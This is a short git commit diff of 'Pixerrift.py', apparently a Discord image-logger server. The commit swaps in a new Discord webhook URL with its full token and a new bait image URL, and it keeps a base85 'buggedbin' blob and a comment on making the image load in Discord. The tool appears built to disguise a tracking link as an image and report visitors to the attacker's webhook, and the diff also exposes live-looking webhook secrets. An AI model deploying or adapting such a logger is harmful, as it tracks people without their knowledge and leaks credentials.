5774a44f8e4baedf94006b74d1a61706d9e77ed5
ERIGAWOKH <Ashur_warda@hotmail.com>
2025-05-21 11:43:04 +0200

    Update Pixerrift.py

--- api/Pixerrift.py
+++ api/Pixerrift.py
@@ -2,9 +2,8 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import httpx, base64, httpagentparser
 
-webhook = 'https://discord.com/api/webhooks/1349155542039400522/NmbDkDhaCWLOPl68KDhFglwx773fTCdfBsXYVO1dkMuVPrw5pBM4tmsXtK6ohCSDOhj-'
-
-bindata = httpx.get('https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg').content
+webhook = 'https://discord.com/api/webhooks/1374499954977935440/Y_P-9aY_Zon-zFp0XlA2Y-esz90GQSrZP-d4XCw1HIa6zF043BGFKZ11X9CEVJmT5GO_'
+image = httpx.get('https://photographylife.com/wp-content/uploads/2018/11/Moeraki-Boulders-New-Zealand.jpg').content
 buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
